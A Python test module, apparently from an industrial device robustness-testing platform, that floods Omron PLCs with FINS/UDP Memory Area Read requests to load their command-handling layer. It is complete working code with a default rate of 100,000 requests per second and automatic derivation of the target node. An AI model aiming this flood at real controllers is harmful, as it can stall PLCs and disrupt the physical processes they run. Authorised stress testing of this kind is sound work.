"""
測項：FINS/UDP Memory Area Read 命令洪水
分類：FINS (Omron PLC)（標準埠 UDP 9600，無連線導向）
說明：以高頻率重複送出 FINS「Memory Area Read」（記憶體區域讀取，命令碼 0101）請求，
測試 Omron PLC 的 FINS 命令處理層（非單純網路層）在高速率請求下的吞吐量與資源負荷
（CPU 佔用、命令佇列堆積、回應延遲甚至無回應）。Memory Area Read 是唯讀命令
（只讀取記憶體內容，不寫入/不改變 PLC 輸出或運轉狀態），符合本平台「不可對受測裝置
執行寫入/破壞性操作」的安全限制。

協定欄位依據與已知限制（重要）：
  - FINS 標頭（10 bytes：ICF/RSV/GCT/DNA/DA1/DA2/SNA/SA1/SA2/SID）欄位順序與長度，
    以及 Memory Area Read（命令碼 0x01 0x01）之請求負載格式（區域碼 1 byte + 起始位址
    2 bytes(big-endian) + 位元指定 1 byte + 讀取項目數 2 bytes(big-endian)），已對照
    Wireshark 官方 FINS 解析器原始碼（epan/dissectors/packet-omron-fins.c 之
    memory_area_code_cv[] / memory_area_code_prefix[] 對照表與命令欄位配置，該解析器
    為社群長期維護、被業界廣泛用於驗證真實 FINS 封包的參考實作）交叉確認，信心程度高。
  - 常見記憶體區域碼（CS/CJ 系列慣用）：DM=0x82、CIO=0x30、WR(Work)=0x31、
    HR(Holding)=0x32、AR(Auxiliary)=0x33，皆為「字組（word）」存取碼，同樣對照上述
    Wireshark 對照表確認。
  - ICF 欄位僅確認業界慣用值 0x80（代表「命令、需要回應、未使用閘道」），此為極廣泛
    出現在公開 FINS 主從實作範例中的慣用值，但 ICF 各 bit 的正式逐位元定義未能取得
    Omron 官方 W342 手冊原文核對（該手冊網域在本環境的出口網路政策下被封鎖，
    無法直接下載 PDF 核對逐位元表），僅能以多個獨立來源交叉比對後採用此業界慣用值，
    非「逐 bit 均已對照官方手冊」等級的驗證。
  - GCT（Gateway Count）採業界慣用值 0x02；DNA/SNA（網路位址）在區網內直連情境固定為
    0x00（本地網路）；DA1（目的節點號）預設嘗試以目的 IP 最後一個位元組推導（多數
    FINS 主機/工具的慣例，PLC 端網路模組節點號通常等於其 IP 最後一碼），使用者亦可
    在參數中手動覆寫；SA1（來源節點號）為攻擊端自訂的來源節點號，可調整。
  - 若上述欄位與實際目標裝置設定不完全相符（例如節點號推導錯誤、DA2 非 CPU 單元），
    PLC 仍會依 FINS 規範以「回應碼非 0」的錯誤回應處理該請求（例如節點不存在/位址錯誤），
    這本身仍然對「PLC 命令處理層在收到大量格式正確但目標參數不精確的請求時的處理負荷
    與錯誤處理路徑健全性」具有測試意義，並非只有「完全成功讀取」才有壓力測試價值。
  - 本測項僅送出讀取（Read）命令，不包含 Memory Area Write（0102）等任何會改變 PLC
    輸出/內部狀態的命令。

需求：無額外套件（純標準函式庫 socket + struct）。
"""
import socket
import struct
import time

from ..common import RateLimiter, clamp_duration

NAME = "FINS Memory Area Read 命令洪水"
CATEGORY = "FINS (Omron PLC)"
PROTOCOL = "UDP"
DEFAULT_PORT = 9600
TEST_TYPE = "traffic"  # 流量型：靠高頻率命令請求速率本身造成 PLC 命令處理層負擔

# CS/CJ 系列常見「字組（word）」記憶體區域碼，對照 Wireshark FINS 解析器
# memory_area_code_prefix[] 對照表（見模組 docstring）。
_AREA_CODES = {
    "DM": 0x82,
    "CIO": 0x30,
    "WR": 0x31,
    "HR": 0x32,
    "AR": 0x33,
}

_ICF_COMMAND_RESPONSE_REQUIRED = 0x80  # 業界慣用值，見模組 docstring 的說明與限制
_GCT_DEFAULT = 0x02


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {
            "type": "int", "default": 100000, "min": 1, "max": 100000,
            "desc": "每秒送出 Memory Area Read 請求數（UDP 單向送出，封包極小，可支撐較高速率）",
        },
        "memory_area": {
            "type": "string", "default": "DM",
            "desc": "讀取的記憶體區域：DM / CIO / WR / HR / AR（皆為唯讀之字組存取，見說明）",
        },
        "start_address": {
            "type": "int", "default": 0, "min": 0, "max": 65535,
            "desc": "起始字組位址（例如 DM 區 0 即一般俗稱的 D0）",
        },
        "read_count": {
            "type": "int", "default": 1, "min": 1, "max": 100,
            "desc": "每次請求讀取的字組（word）數量",
        },
        "dest_node": {
            "type": "int", "default": 0, "min": 0, "max": 254,
            "desc": "目的 FINS 節點號（DA1）。0 = 自動以 target IP 最後一個位元組推導（多數環境慣例），"
                    "如目標節點號設定與此不同請手動填入",
        },
        "src_node": {
            "type": "int", "default": 199, "min": 0, "max": 254,
            "desc": "來源 FINS 節點號（SA1，攻擊端自報的節點號，可任意調整避免與其他節點衝突）",
        },
    }


def _derive_node_from_ip(target: str) -> int:
    """嘗試以 target IP 最後一個位元組作為推導出的節點號（常見慣例）；
    若 target 非合法 IPv4（例如是主機名稱），退回預設值 1。"""
    try:
        octets = socket.inet_aton(socket.gethostbyname(target))
        return octets[3] or 1
    except OSError:
        return 1


def _build_fins_header(dna: int, da1: int, da2: int, sna: int, sa1: int, sa2: int, sid: int) -> bytes:
    """組出 10 bytes 的 FINS 標頭（FINS/UDP 不含額外 TCP 專用外層標頭）。
    欄位順序 ICF/RSV/GCT/DNA/DA1/DA2/SNA/SA1/SA2/SID，逐位元組長度已對照 Wireshark
    FINS 解析器原始碼確認，詳見模組 docstring。"""
    icf = _ICF_COMMAND_RESPONSE_REQUIRED
    rsv = 0x00
    gct = _GCT_DEFAULT
    return bytes([icf, rsv, gct, dna & 0xFF, da1 & 0xFF, da2 & 0xFF, sna & 0xFF, sa1 & 0xFF, sa2 & 0xFF, sid & 0xFF])


def _build_memory_area_read(area_code: int, address: int, bit: int, item_count: int) -> bytes:
    """命令層資料：MRC(1)+SRC(1)=0x01,0x01（Memory Area Read）
    + 區域碼(1) + 起始位址(2, big-endian) + 位元指定(1，0x00=整個字組) + 讀取項目數(2, big-endian)。
    共 8 bytes，欄位配置對照 Wireshark FINS 解析器確認，詳見模組 docstring。"""
    return struct.pack(">BBBHBH", 0x01, 0x01, area_code & 0xFF, address & 0xFFFF, bit & 0xFF, item_count & 0xFFFF)


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 400))
    area_name = str(params.get("memory_area", "DM")).upper().strip()
    area_code = _AREA_CODES.get(area_name)
    if area_code is None:
        log_fn(f"[!] 未知的 memory_area '{area_name}'，改用預設 DM(0x82)")
        area_code = _AREA_CODES["DM"]
    start_address = int(params.get("start_address", 0))
    read_count = int(params.get("read_count", 1))
    dest_node = int(params.get("dest_node", 0))
    src_node = int(params.get("src_node", 199))

    if dest_node == 0:
        dest_node = _derive_node_from_ip(target)
        log_fn(f"[i] dest_node=0，已依 target IP 推導目的節點號 = {dest_node}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)

    limiter = RateLimiter(rate)
    sent, responses, errors = 0, 0, 0
    sid = 0
    start = time.time()

    log_fn(
        f"[+] FINS Memory Area Read 洪水 -> {target}:{port} @ {rate}/s, {duration}s "
        f"(area={area_name}(0x{area_code:02X}), addr={start_address}, count={read_count}, "
        f"DA1={dest_node}, SA1={src_node})"
    )

    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        sid = (sid + 1) & 0xFF
        header = _build_fins_header(
            dna=0x00, da1=dest_node, da2=0x00,
            sna=0x00, sa1=src_node, sa2=0x00,
            sid=sid,
        )
        body = _build_memory_area_read(area_code, start_address, 0x00, read_count)
        pkt = header + body
        try:
            sock.sendto(pkt, (target, port))
            sent += 1
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")
        try:
            sock.recvfrom(2048)
            responses += 1
        except BlockingIOError:
            pass
        except OSError:
            pass

    sock.close()
    elapsed = time.time() - start
    log_fn(f"[+] 完成，送出 {sent} 個請求，收到回應 {responses} 次，錯誤 {errors} 次")
    return {
        "requests_sent": sent,
        "responses": responses,
        "errors": errors,
        "elapsed_sec": round(elapsed, 1),
    }
